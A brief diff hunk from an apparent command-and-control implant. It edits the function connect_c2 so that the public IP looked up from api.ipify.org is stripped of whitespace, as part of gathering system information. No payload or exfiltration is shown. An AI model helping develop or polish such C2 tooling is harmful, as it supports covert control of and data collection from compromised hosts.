@@ -1073,7 +1073,7 @@ def connect_c2():
 
             # Gather real system info (use session UA even for IP lookup)
             try:
-                ip = get_session().get("https://api.ipify.org", timeout=10).text
+                ip = get_session().get("https://api.ipify.org", timeout=10).text.strip()
             except Exception:
                 ip = "unknown"
 
